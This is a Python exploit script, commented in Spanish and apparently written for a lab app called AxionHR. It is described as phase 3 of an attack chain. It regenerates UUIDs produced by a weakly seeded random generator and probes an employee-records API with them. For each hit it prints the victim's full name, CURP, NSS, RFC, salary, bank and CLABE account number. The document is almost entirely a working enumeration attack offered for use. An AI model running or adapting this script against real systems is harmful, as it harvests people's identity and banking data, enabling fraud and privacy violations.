#!/usr/bin/env python3
"""
AxionHR — UUID Enumeration Script
===================================
Fase 3 de la cadena de ataque:
Genera candidatos UUID basados en PRNG débil y los prueba contra la API.

Uso:
  1. Edita BASE_URL y TOKEN con tus valores
  2. Edita SEED_BASE con el timestamp aproximado de registro de las víctimas
  3. python3 enumerar.py

Creado por Elisa Elias — Cinn4mor0ll
"""

import random
import uuid
import requests

# ── Configuración ─────────────────────────────────────────────
BASE_URL   = "http://localhost:5000/api/v1"   # Cambiar por tu URL
TOKEN      = "PEGA_TU_TOKEN_AQUI"
SEED_BASE  = 0                                # Timestamp aproximado del registro víctima
VENTANA    = 60                               # Segundos a buscar antes/después del seed
# ──────────────────────────────────────────────────────────────


def enumerar():
    auth = {"Authorization": f"Bearer {TOKEN}"}
    encontrados = []

    print("=" * 60)
    print("  AxionHR UUID Enumeration — Cinn4mor0ll")
    print("=" * 60)
    print(f"\n[*] Seed base    : {SEED_BASE}")
    print(f"[*] Ventana      : ±{VENTANA} segundos")
    print(f"[*] Seeds a probar: {VENTANA * 2}")
    print(f"[*] Target       : {BASE_URL}\n")
    print("[*] Iniciando enumeración...\n")

    for seed in range(SEED_BASE - VENTANA, SEED_BASE + VENTANA):
        random.seed(seed)
        for _ in range(6):
            candidato = str(uuid.UUID(int=random.getrandbits(128), version=4))
            try:
                r = requests.get(
                    f"{BASE_URL}/empleados/{candidato}/expediente",
                    headers=auth,
                    timeout=3
                )
                if r.status_code == 200:
                    d  = r.json()
                    e  = d["empleado"]
                    lb = d["datos_laborales"]
                    b  = d["datos_bancarios"]

                    print(f"[HIT] seed: {seed} | UUID: {candidato}")
                    print(f"      Nombre  : {e['nombre_completo']}")
                    print(f"      CURP    : {e['curp']}")
                    print(f"      NSS     : {e['nss']}")
                    print(f"      RFC     : {e['rfc']}")
                    print(f"      Puesto  : {e['puesto']}")
                    print(f"      Salario : ${lb['salario_mensual']:,.0f} MXN/mes")
                    print(f"      Banco   : {b['banco']}")
                    print(f"      CLABE   : {b['clabe']}")
                    print()
                    encontrados.append(candidato)

            except requests.exceptions.RequestException:
                pass

    print("=" * 60)
    print(f"  Enumeración completada — {len(encontrados)} empleados encontrados")
    print("=" * 60)

    return encontrados


if __name__ == "__main__":
    if SEED_BASE == 0:
        print("[!] Configura SEED_BASE con el timestamp de registro de las víctimas")
        print("    Puedes obtenerlo con:")
        print("    python3 -c \"from datetime import datetime,timezone; print(int(datetime(2026,5,29,4,56,3,tzinfo=timezone.utc).timestamp()))\"")
    else:
        enumerar()
